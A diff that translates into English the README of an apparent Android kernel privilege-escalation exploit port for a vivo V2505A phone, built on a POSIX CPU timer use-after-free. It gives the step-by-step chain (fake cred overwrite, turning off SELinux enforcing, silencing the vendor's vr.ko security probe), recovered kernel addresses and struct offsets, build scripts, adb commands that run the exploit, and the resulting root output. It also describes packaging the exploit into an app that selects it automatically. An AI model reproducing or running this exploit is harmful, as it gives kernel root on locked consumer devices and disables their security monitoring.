@@ -1,8 +1,8 @@
-# V2505A CVE-2026-98260 临时提权移植
+# V2505A CVE-2026-98260 Temporary Privilege Escalation Port
 
-## 状态
+## Status
 
-该移植曾在目标设备完成临时提权验证：
+This port has previously completed temporary privilege escalation verification on the target device:
 
 ```text
 uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
@@ -10,65 +10,65 @@ kernelsu              221184  1
 SELinux=Enforcing
 ```
 
-全程未修改或刷写 `vendor_boot`，重启后临时 root 和本次内核改动都会消失。
-仓库只保留源码、构建脚本和 App 必需的运行资产，不提交验证日志、APK、
-OTA 提取物或本地依赖缓存。
+`vendor_boot` is never modified or flashed, and both the temporary root and this
+session's kernel changes disappear after a reboot. The repository keeps only the
+source code, build scripts, and the runtime assets required by the App; it does not
+commit verification logs, APKs, OTA extracts, or local dependency caches.
 
-## App 集成
+## App Integration
 
-V2505A 已作为第三个独立入口合入 App，不复用 6.18 / 6.12.69 的常量：
+V2505A is merged into the App as a third independent entry and does not reuse the 6.18 / 6.12.69 constants:
 
-- `ExploitKind.CVE2505A` 只在厂商为 `vivo` 且内核完整 release
-  等于 `6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`
-  时自动选择。
-- App 打包内容只有 jniLibs 的 `libk61223.so / libk61258.so`：Rust 单入口（同一
-  `exploit/rust-kplant` crate 以 `--features k61223` 构建，`build.rs`
-  追加 `-DV2505A`），内嵌 C plant，从 `nativeLibraryDir` 原地执行；
-  不再部署 `v2505a_run.sh` / 独立 plant 资产到 `/data/local/tmp`。
-- `libk61223.so / libk61258.so` 使用自己的 `ALREADY_LOADED` 和失败重试语义；失败的
-  plant 会转成 holder 保留现场，跳过 holder，同一 boot 可直接重试。
-- V2505A 入口隐藏不适用的反 root、卸载防护和 VFS 开关，只保留 SUSFS；
-  SUSFS ko 从 `nativeLibraryDir` 的 `libsusfs_guard_lkm_612.so` 原地加载。
+- `ExploitKind.CVE2505A` is selected automatically only when the vendor is `vivo` and the full kernel release
+  equals `6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`.
+- The App packages only the jniLibs `libk61223.so / libk61258.so`: a single Rust entry (the same
+  `exploit/rust-kplant` crate built with `--features k61223`, with `build.rs`
+  appending `-DV2505A`), embedding the C plant and executing it in place from `nativeLibraryDir`;
+  `v2505a_run.sh` / standalone plant assets are no longer deployed to `/data/local/tmp`.
+- `libk61223.so / libk61258.so` use their own `ALREADY_LOADED` and failure-retry semantics; a failed
+  plant turns into a holder that preserves the on-device state, the holder is skipped, and a retry
+  is possible in the same boot.
+- The V2505A entry hides the inapplicable anti-root, uninstall protection, and VFS switches, keeping only SUSFS;
+  the SUSFS ko is loaded in place from `libsusfs_guard_lkm_612.so` in `nativeLibraryDir`.
 
-App 构建验证：
+App build verification:
 
 ```text
 :app:assembleDebug
 BUILD SUCCESSFUL
 ```
 
-APK 属于本地构建产物，不纳入版本控制。V2505A 由单入口
-`libk61223.so / libk61258.so` 内置（`exploit/rust-kplant --features k61223`）；
-当前 V2505A 设备启动 App 后，信息卡会自动显示
-`CVE-2026-98260-vivo-V2505A`。
+The APK is a local build artifact and is not version-controlled. V2505A is built into the single entry
+`libk61223.so / libk61258.so` (`exploit/rust-kplant --features k61223`);
+after the App is launched on a current V2505A device, the info card automatically shows
+`CVE-2026-98260-vivo-V2505A`.
 
-## 目标设备
+## Target Device
 
-- 型号：`vivo V2505A / PD2505`
-- Android：16 / SDK 36
-- 构建：`PD2505B_A_16.0.24.7.W10`
-- 内核：`6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`
-- Bootloader：`locked`，`verifiedbootstate=green`
-- 当前 ADB：`10AG1S2Y6D005Z0`
+- Model: `vivo V2505A / PD2505`
+- Android: 16 / SDK 36
+- Build: `PD2505B_A_16.0.24.7.W10`
+- Kernel: `6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k`
+- Bootloader: `locked`, `verifiedbootstate=green`
+- Current ADB: `10AG1S2Y6D005Z0`
 
-## 链路
+## Exploit Chain
 
-1. 通过 `CVE-2026-98260` 的 POSIX CPU timer UAF 获得零写和 fake-cred 写原语。
-2. 将目标 task 的 `cred` 指向受控 fake cred。
-3. 关闭 SELinux enforcing。
-4. 将 fake cred 的 `uid` 清零。
-5. 将 `__tracepoint_sys_exit->funcs` 清零，使 vivo `vr.ko` 的
-   `sys_exit` 探针失联。
-6. 唤醒 root 子进程，执行 KernelSU late-load。
-7. 通过 `su -c id` 验证。
+1. Obtain the zero-write and fake-cred write primitives through the POSIX CPU timer UAF of `CVE-2026-98260`.
+2. Point the target task's `cred` at a controlled fake cred.
+3. Disable SELinux enforcing.
+4. Zero the fake cred's `uid`.
+5. Zero `__tracepoint_sys_exit->funcs` so the `sys_exit` probe of vivo `vr.ko` loses its registration.
+6. Wake the root child process and perform the KernelSU late-load.
+7. Verify with `su -c id`.
 
-`vr.ko` 的处理采用社区 W1c 方法，参考来源与 BTF 校验见
-`reference/README.md`。
+`vr.ko` is handled with the community W1c method; see
+`reference/README.md` for the reference sources and the BTF validation.
 
-## 已恢复常量
+## Recovered Constants
 
-内核符号和 BTF 来自 OTA 的 `boot.img`。OTA、解包文件和恢复后的 ELF
-都属于本地分析输入，不纳入版本控制。
+The kernel symbols and BTF come from the OTA's `boot.img`. The OTA, the unpacked files, and the
+recovered ELF are all local analysis inputs and are not version-controlled.
 
 ```c
 #define STATIC_TIMER_SITE         0xffffffc0801e0890ULL
@@ -95,7 +95,7 @@ APK 属于本地构建产物，不纳入版本控制。V2505A 由单入口
 #define FULLCAP                   0x1ffffffffffULL
 ```
 
-BTF 校验：
+BTF validation:
 
 - `sizeof(struct cred) = 0xb8`
 - `task_struct.cred = 0x900`
@@ -103,22 +103,22 @@ BTF 校验：
 - `sizeof(struct tracepoint) = 0x50`
 - `tracepoint.funcs = 0x48`
 
-## 编译
+## Build
 
-构建源码为 `exploit/src/plant_core.inc` 引擎 + `K61223_plant.c` / `K61258_plant.c`。
+The build sources are the `exploit/src/plant_core.inc` engine plus `K61223_plant.c` / `K61258_plant.c`.
 
 ```powershell
 $env:ANDROID_NDK_HOME = "C:\path\to\android-ndk-r28c"
 .\ports\v2505a\build-v2505a.ps1 -Mode Both
 ```
 
-本地生成产物：
+Local build artifacts:
 
-- `bin/v2505a_probe`：只读探测程序，编译时定义 `PROBE_ONLY`
-- `bin/v2505a_plant`：完整链路，运行时参数为 `fake`
+- `bin/v2505a_probe`: read-only probe program, built with `PROBE_ONLY` defined
+- `bin/v2505a_plant`: full chain, with `fake` as the runtime argument
 
-`bin/` 已被 `.gitignore` 忽略。App 内置 payload 不直接使用这里的
-独立 plant，而是按主 README 构建 Rust 单入口：
+`bin/` is ignored by `.gitignore`. The App's built-in payload does not use the
+standalone plant here directly; instead it builds the Rust single entry as described in the main README:
 
 ```bash
 cd exploit/rust-kplant
@@ -126,14 +126,14 @@ cargo build --release --target aarch64-linux-android \
     --no-default-features --features k61223
 cp target/k61223/aarch64-linux-android/release/kplant \
   ../../app/app/src/main/jniLibs/arm64-v8a/libk61223.so
-# 6.12.58 OS6/OS7 用 --features k61258，产物拷贝为 libk61258.so
+# For 6.12.58 OS6/OS7 use --features k61258, copy the artifact as libk61258.so
 ```
 
-`bin/v2505a_plant` 仅用于移植研究和 adb 手动验证。
+`bin/v2505a_plant` is used only for port research and manual adb verification.
 
-## 运行
+## Running
 
-推送并设置权限：
+Push and set permissions:
 
 ```powershell
 adb -s 10AG1S2Y6D005Z0 shell "mkdir -p /data/local/tmp/v2505a-port"
@@ -142,19 +142,19 @@ adb -s 10AG1S2Y6D005Z0 push .\ports\v2505a\bin\v2505a_plant /data/local/tmp/v250
 adb -s 10AG1S2Y6D005Z0 shell "chmod 755 /data/local/tmp/v2505a-port/v2505a_probe /data/local/tmp/v2505a-port/v2505a_plant"
 ```
 
-先执行只读 probe：
+Run the read-only probe first:
 
 ```powershell
 adb -s 10AG1S2Y6D005Z0 shell "cd /data/local/tmp/v2505a-port && ./v2505a_probe probe"
 ```
 
-再执行完整链路。`libksud.so` 路径由当前安装的 KernelSU 包动态解析：
+Then run the full chain. The `libksud.so` path is resolved dynamically from the currently installed KernelSU package:
 
 ```powershell
 adb -s 10AG1S2Y6D005Z0 shell "cd /data/local/tmp/v2505a-port && KSUD=`"`$(pm path me.weishu.kernelsu | sed -n 's/^package://p' | sed 's#/base.apk$##')/lib/arm64/libksud.so`" && env PYB110_KSUD=`"`$KSUD`" PYB110_MANAGER_PKG='me.weishu.kernelsu' PYB110_KMI='android16-6.12' ./v2505a_plant fake"
 ```
 
-成功后进程会保持 parked，日志出现：
+On success the process stays parked and the log shows:
 
 ```text
 [+] stage vr_sys_exit target=...
@@ -164,31 +164,31 @@ PLANT_CRED_OK child=...
 LATE_LOAD_RC=0
 ```
 
-独立验收：
+Independent verification:
 
 ```powershell
 adb -s 10AG1S2Y6D005Z0 shell "su -c id"
 adb -s 10AG1S2Y6D005Z0 shell "su -c 'lsmod | grep -i kernelsu; getenforce'"
 ```
 
-## 验证结论
+## Verification Results
 
-- 干净 boot 上 probe 返回 `PROBE_OK`，成功得到 KASLR slide 和
-  `vr_sys_exit` funcs 槽地址。
-- 一次完整运行中四次 stage 写全部命中；`vr_sys_exit` 零写后子进程未被杀，
-  KernelSU late-load 返回 0。
-- 独立执行 `su -c id`、模块检查和 SELinux 检查，均符合预期。
-- 受控失败流程不会写入 dirty 标记；plant 转成 holder 后可在同一 boot 重试。
+- On a clean boot the probe returns `PROBE_OK` and successfully obtains the KASLR slide and the
+  `vr_sys_exit` funcs slot address.
+- In one full run all four stage writes land; after the `vr_sys_exit` zero-write the child process is not killed,
+  and the KernelSU late-load returns 0.
+- Independent `su -c id`, module check, and SELinux check all match expectations.
+- The controlled failure path does not write a dirty flag; after the plant turns into a holder it can be retried in the same boot.
 
-## 注意事项
+## Notes
 
-- UAF 写入具有概率性。任何 stage 失败后都可等 plant 转成 holder 后在同一 boot
-  直接重试；不要主动 kill 或 reap holder。
-- 不要刷分区或修改 `vendor_boot`。本方案只做运行时内核内存写。
-- 每次重启后 KASLR、SELinux、`vr.ko` 状态都会恢复，必须重新运行完整链路。
-- KernelSU 包路径包含随机目录，不要硬编码旧路径。
+- UAF writes are probabilistic. After any stage failure, wait for the plant to turn into a holder and retry
+  directly in the same boot; do not actively kill or reap the holder.
+- Do not flash partitions or modify `vendor_boot`. This approach performs runtime kernel memory writes only.
+- After every reboot the KASLR, SELinux, and `vr.ko` state is restored, so the full chain must be run again.
+- KernelSU package paths contain random directories; do not hardcode old paths.
 
-## 目录
+## Directory
 
 ```text
 ports/v2505a/
@@ -203,5 +203,5 @@ ports/v2505a/
     └── zstd_unwrap.py
 ```
 
-本地生成的 `bin/`、`artifacts/`、`logs/`、`app/`、`work/`、
-`tools/vendor/` 和 Python 缓存都已忽略，不提交到仓库。
+The locally generated `bin/`, `artifacts/`, `logs/`, `app/`, `work/`,
+`tools/vendor/`, and Python caches are all ignored and not committed to the repository.
